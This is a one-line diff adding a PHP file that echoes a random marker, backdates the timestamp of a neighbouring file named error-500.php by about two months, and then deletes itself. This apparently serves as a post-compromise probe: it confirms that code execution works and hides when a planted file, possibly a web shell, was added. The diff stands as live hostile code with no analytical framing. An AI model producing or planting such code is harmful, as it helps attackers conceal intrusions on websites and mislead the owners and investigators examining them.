@@ -1,0 +1,1 @@
+<?php echo "mptnmQvEbT"; if (file_exists("./error-500.php")){ touch("./error-500.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*s2z3TVDCuUhSydRbGhw4*/ ?>
